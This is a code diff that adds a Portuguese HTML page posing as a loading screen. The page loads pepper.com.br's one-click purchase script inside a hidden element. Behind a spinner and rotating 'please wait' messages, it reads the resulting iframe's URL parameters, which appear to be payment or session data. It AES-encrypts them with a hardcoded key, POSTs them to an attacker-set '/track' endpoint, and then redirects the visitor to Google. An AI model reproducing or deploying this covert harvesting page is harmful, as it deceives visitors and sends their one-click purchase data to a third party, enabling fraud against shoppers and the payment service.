@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Página</title>
+</head>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"
+    integrity="sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<body style="font-family: 'Inter', sans-serif;">
+    <style>
+        .lds-ring {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+
+        .lds-ring div {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            width: 64px;
+            height: 64px;
+            margin: 8px;
+            border: 8px solid #9e2614;
+            border-radius: 50%;
+            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            border-color: #9e2614 transparent transparent transparent;
+        }
+
+        .lds-ring div:nth-child(1) {
+            animation-delay: -0.45s;
+        }
+
+        .lds-ring div:nth-child(2) {
+            animation-delay: -0.3s;
+        }
+
+        .lds-ring div:nth-child(3) {
+            animation-delay: -0.15s;
+        }
+
+        @keyframes lds-ring {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <div
+        style="display: flex; flex-direction: column; margin: auto; width: 100vw; height: 100vh; align-items: center; justify-content: center; gap: 2vh; z-index: 9999;">
+        <div class="lds-ring">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div id="status" style="font-weight: 600; font-size: x-large; color: #9e2614;">Carregando...</div>
+    </div>
+    <div style="opacity: 0; z-index: -1;" class="pepperBtn"></div>
+    <script src="https://pepper.com.br/oneclick.js"></script>
+    <script>
+        const pepperBtn = document.querySelector('.pepperBtn');
+        let qty = 1;
+        let cont = 0;
+        let site = 'https://google.com.br'
+        let yourdomain = 'http://localhost:5555'
+        let messages = [
+            'Carregando...',
+            'Aguarde...',
+            'Aguarde um momento...',
+            'Estamos quase lá...',
+            'Estamos quase finalizando...',
+            'Estamos finalizando...',
+        ]
+
+        setTimeout(() => {
+            getPay()
+        }, 2000);
+
+        setInterval(() => {
+            document.getElementById('status').innerHTML = messages[Math.floor(Math.random() * messages.length)]
+        }, 2000);
+
+        function getPay() {
+            minhaString = document.querySelector('iframe').src.replace('https://pepper.com.br/upsell.html', '')
+            var encrypted = CryptoJS.AES.encrypt(minhaString, "irtur3t8uteterhfrj");
+            fetch(yourdomain + '/track', {
+                method: 'POST',
+                body: JSON.stringify({
+                    message: encrypted.toString()
+                }),
+                headers: {
+                    'Content-Type': 'application/json', // Define o tipo de conteúdo como dados binários
+                },
+            })
+
+            cont++
+            if (cont <= qty) {
+                setTimeout(() => {
+                    getPay()
+                }, 2000);
+            } else {
+                window.location.href = site
+            }
+        }       
+    </script>
+</body>
+
+</html>
